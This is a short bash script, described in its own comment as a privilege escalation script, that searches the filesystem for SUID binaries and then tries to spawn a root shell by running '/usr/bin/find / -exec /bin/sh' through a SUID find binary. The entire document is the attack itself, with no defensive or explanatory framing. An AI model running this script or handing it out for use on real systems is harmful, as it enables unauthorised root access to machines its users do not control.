#!/bin/bash
# Simple privilege escalation script

# Check for SUID binaries
echo "[*] Checking for SUID binaries..."
find / -perm -4000 -type f 2>/dev/null

# Attempt to use a common SUID binary for escalation
echo "[*] Attempting to use 'find' with SUID..."
/usr/bin/find / -exec /bin/sh \;